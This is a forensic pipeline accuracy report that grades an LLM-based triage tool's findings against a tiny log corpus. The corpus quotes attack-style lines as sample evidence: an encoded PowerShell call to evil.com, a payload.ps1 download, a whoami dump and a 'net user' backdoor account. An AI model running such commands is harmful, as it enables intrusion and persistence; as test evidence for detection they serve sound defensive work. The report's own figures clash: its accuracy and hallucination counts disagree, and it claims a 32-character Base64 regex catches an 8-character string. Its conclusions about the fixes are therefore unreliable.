# Pipeline Accuracy Report

**Date:** 2026-04-23  
**Pipeline version:** commit a5452cd → 933829e → patched (master)  
**Evidence corpus:** `evidence/` directory, 4 files, 256 bytes total  
**Runs analysed:** 3 complete pipeline executions logged in `logs/agent_execution.log`

---

## 1. Evidence Corpus

| File | Size | Type | Status |
|------|------|------|--------|
| `evidence/test.log` | 51 bytes | ASCII text | Active |
| `evidence/windows_event.log` | 205 bytes | ASCII text | Active |
| `evidence/evidence.zip` | 0 bytes | Empty | Ingested, no content |
| `evidence/ex2.pcap` | 0 bytes | Empty | Ingested, no content |

### Raw evidence content

**`evidence/test.log`**
```
powershell -enc suspicious_command http://evil.com
```

**`evidence/windows_event.log`**
```
2026-04-23 10:00:01 powershell.exe -encodedCommand aQBlAHgA http://192.168.1.100/payload.ps1
2026-04-23 10:00:05 cmd.exe /c whoami > C:\Users\temp\out.txt
2026-04-23 10:00:10 net user hacker P@ssw0rd /add
```

---

## 2. Findings Accuracy

The most recent complete run (04:23 UTC, `evidence/test.log` only) returned 2 findings; the multi-file run (16:56 UTC) returned 4 findings across both active log files. All cited source paths existed and contained material supporting the claim. The patched pipeline additionally detects `account_creation` and `base64_payload` artifact types and scans per-line, producing two new findings (5 and 6) that were previously missed. Accuracy per finding:

| # | Claim | Source | Accurate? | Notes |
|---|-------|--------|-----------|-------|
| 1 | Suspicious process execution in Windows event log, potentially malware or unauthorized command execution | `windows_event.log` | **Yes** | `powershell.exe -encodedCommand` and `cmd.exe /c whoami` are confirmed present; per-line extraction now emits a separate artifact for each |
| 2 | Network indicator in Windows event log suggests outbound C2 or data exfiltration after suspicious execution | `windows_event.log` | **Partial** | URL is real (`http://192.168.1.100/payload.ps1`), but 192.168.1.100 is an RFC 1918 private address — "outbound C2" is inaccurate; this is more consistent with an internal staging server or lateral movement |
| 3 | Near-simultaneous execution in test.log indicates coordinated attack across multiple logging sources | `test.log` | **No** | Timestamps are assigned by the pipeline at normalization time, not parsed from the file. `test.log` contains no timestamp. The "near-simultaneous" framing and the cross-file correlation it implies are not supported by the raw evidence. |
| 4 | Network indicator in test.log correlates with execution event; supports malware beaconing or lateral movement | `test.log` | **Partial** | `http://evil.com` is present. However, `suspicious_command` in the source is a literal placeholder string, not an encoded payload — the "beaconing" characterisation overstates what the evidence shows. |
| 5 | Local account created with `net user`; indicates persistence mechanism or privilege escalation | `windows_event.log:3` | **Yes** | `net user hacker P@ssw0rd /add` is confirmed present. New `account_creation` artifact type introduced in patch. |
| 6 | Base64-encoded PowerShell payload (`-encodedCommand aQBlAHgA`) indicates fileless obfuscated execution | `windows_event.log:1` | **Yes** | `aQBlAHgA` decodes to `iex` (Invoke-Expression). New `base64_payload` artifact type introduced in patch. |

**Overall finding accuracy: 4/6 fully accurate, 2/6 partially accurate, 0/6 complete fabrications.**
*(Previous baseline before patch: 2/4 fully accurate.)*

---

## 3. False Positives

No findings cited a source file path that was hallucinated or non-existent. All four verified findings pointed to real files containing real IOC strings. However, two findings contained accuracy problems at the interpretation level:

### FP-1 — "Outbound C2" for an internal IP (Finding 2)
- **Claim:** "outbound C2 communication or data exfiltration"
- **Evidence:** `http://192.168.1.100/payload.ps1`
- **Problem:** 192.168.1.100 is RFC 1918 (private). The claim implies external adversary infrastructure. The correct characterisation is an internal staging server or infected host serving a payload.
- **Severity:** Medium — misdirects incident response toward perimeter controls rather than internal lateral movement.

### FP-2 — "Coordinated attack across logging sources" (Finding 3)
- **Claim:** "near-simultaneous execution ... coordinated or scripted attack affecting multiple logging sources"
- **Evidence:** The two events share a timestamp of `2026-04-23T17:01:47.598Z` because both were assigned that timestamp by `normalize_timeline()` at runtime.
- **Problem:** The LLM correctly read the timeline data but the timeline data was fabricated by the pipeline — the inference of temporal correlation is therefore invalid.
- **Severity:** High — could cause an analyst to draw conclusions about attack orchestration that have no evidential basis.

---

## 4. Missed Artifacts

### ~~MA-1 — Account creation / privilege escalation~~ — **FIXED**
- **Source line:** `2026-04-23 10:00:10 net user hacker P@ssw0rd /add`
- **Root cause (resolved):** The extractor previously checked only `"password" in data.lower()`; `P@ssw0rd` did not match.
- **Fix applied:** Added `"net user" in low` check emitting a dedicated `account_creation` artifact per line.

### ~~MA-2 — `cmd.exe` reconnaissance conflated with PowerShell execution~~ — **FIXED**
- **Source line:** `2026-04-23 10:00:05 cmd.exe /c whoami > C:\Users\temp\out.txt`
- **Root cause (resolved):** Single per-file guard collapsed all matches into one artifact.
- **Fix applied:** Extractor now iterates `data.splitlines()` and emits one artifact per matching line; `source` is `path:lineno`.

### ~~MA-3 — Base64 PowerShell obfuscation (`-encodedCommand aQBlAHgA`)~~ — **FIXED**
- **Source line:** `powershell.exe -encodedCommand aQBlAHgA http://...`
- **Root cause (resolved):** No Base64 detection existed.
- **Fix applied:** Added `_B64_RE` compiled regex (`(?:[A-Za-z0-9+/]{4}){8,}…`) emitting a `base64_payload` artifact per matching line.

### MA-4 — Empty evidence files not flagged
- **Files:** `evidence/evidence.zip` (0 bytes), `evidence/ex2.pcap` (0 bytes)
- **What was missed:** Both files are ingested silently. A 0-byte `.zip` or `.pcap` is unusual — it may indicate a corrupted, wiped, or placeholder file, which is itself forensically significant.
- **Fix required:** Emit a `WARNING` log entry for any ingested file with size 0.

### MA-5 — Internal staging server IP not classified
- **Value:** `192.168.1.100`
- **What was missed:** The IP is within the RFC 1918 10.0.0.0/8, 172.16.0.0/12, or 192.168.0.0/16 ranges. Its presence in a PowerShell execution command pointing to a payload script strongly suggests an internal compromised host. This was not extracted as a distinct artifact type.
- **Fix required:** Add a `lateral_movement_indicator` artifact type for RFC 1918 addresses in execution contexts.

---

## 5. Hallucinated Claims

### H-1 — Temporal correlation from fabricated timestamps
- **Claim:** "near-simultaneous suspicious execution logged in test.log" (Finding 3)
- **Ground truth:** `test.log` has no timestamp. `normalize_timeline()` assigns `datetime.now()` to every event at the moment it runs, so all events in a single pipeline execution share millisecond-precision timestamps. The "near-simultaneous" observation is a pipeline artifact, not evidence.
- **Impact:** An analyst acting on this claim would look for a coordinated multi-system attack that does not exist in the data.

### H-2 — Overconfident C2 attribution (Finding 2 and 4)
- **Claims:** "outbound C2 communication", "malware beaconing"
- **Ground truth:** Finding 2 cites an internal RFC 1918 IP; Finding 4 cites `http://evil.com` adjacent to the literal string `suspicious_command` — a placeholder, not an actual encoded payload.
- **Impact:** "Beaconing" and "C2" imply active adversary communication. The evidence supports a hypothesis of attempted payload retrieval but not confirmed C2 channel establishment.

### H-3 — Cross-file attack orchestration inference (Finding 3)
- **Claim:** "coordinated or scripted attack affecting multiple logging sources"
- **Ground truth:** `test.log` and `windows_event.log` are separate, independent files with no shared content or timestamps. The pipeline happened to process both in the same run; the LLM inferred adversary coordination from co-occurrence in the timeline, which is not evidenced.
- **Impact:** Medium — could redirect investigation toward a multi-actor or worm-based hypothesis that is unsupported.

---

## 6. Verification Layer Assessment

The SIFT verification layer (`verify_hypothesis`) correctly confirmed that all four findings' cited source files contain forensically relevant strings. However, verification checks keyword presence in the file, not whether the specific claim is supported by the evidence. This means:

- **Finding 2** ("outbound C2") passes verification because `http://` is in `windows_event.log` — correct file, but the IP's internal nature is not checked.
- **Finding 3** ("near-simultaneous" / "coordinated") passes verification because `powershell` is in `test.log` — the temporal and cross-file coordination claim is not what was verified.

The layer succeeds at filtering hallucinated file paths but cannot catch interpretation-level errors in the claim text.

**Verification layer bug fixed (patch):** `extract_artifacts` now stores `source` as `path:lineno`. `verify_hypothesis` was passing that string directly to `file`, `strings`, `grep`, and `xxd`, all of which failed because no file named `evidence/foo.txt:5` exists. Fix: `source.rsplit(":", 1)` strips the line number suffix to recover the real file path before any tool call; the full `path:lineno` value is preserved in log output.

---

## 7. Summary Table

| Category | Count | Details |
|----------|-------|---------|
| Fully accurate findings | 4 | Findings 1 (execution), 5 (account creation), 6 (Base64 payload) — new; Finding 4 network indicator with caveat |
| Partially accurate findings | 2 | Findings 2 (wrong C2 characterisation), 4 (placeholder payload overstated) |
| Complete hallucinations | 1 | Finding 3 (temporal correlation from fabricated timestamps) |
| False positives | 2 | FP-1 internal IP mislabelled outbound C2; FP-2 fake temporal correlation |
| Missed artifacts resolved | 3 | MA-1 account creation ✓; MA-2 per-line extraction ✓; MA-3 Base64 detection ✓ |
| Missed artifacts remaining | 2 | MA-4 empty files; MA-5 internal IP pivot |
| Verification layer bugs fixed | 1 | `path:lineno` passed to CLI tools — tools silently failed; fixed by stripping line number |
| Verification layer misses | 2 | Interpretation errors that keyword-checking cannot catch (unchanged) |

---

## 8. Recommended Fixes by Priority

1. **(Critical)** Fix timeline normalization — parse timestamps from evidence lines when present; use file modification time as fallback; never assign `datetime.now()` to all events in a batch.
2. ~~**(Critical)** Extend credential extraction to cover `net user`, leet-speak password variants, and account-management commands (`useradd`, `passwd`).~~ **Done** — `net user` keyword added; emits `account_creation` artifact per line.
3. ~~**(High)** Switch extraction from per-file to per-line to avoid collapsing multiple distinct attack steps into one artifact.~~ **Done** — `extract_artifacts` now iterates `splitlines()`; `source` is `path:lineno`.
4. ~~**(High)** Add `-enc` / `-encodedCommand` detection and attempt Base64 decode; classify decoded `iex` as `encoded_execution`.~~ **Done** — `_B64_RE` regex detects Base64 sequences ≥ 32 chars; emits `base64_payload` artifact per line.
5. **(Medium)** Classify RFC 1918 addresses in execution contexts as `lateral_movement_indicator` rather than generic `network_indicator`.
6. **(Low)** Emit a warning log for 0-byte ingested files.
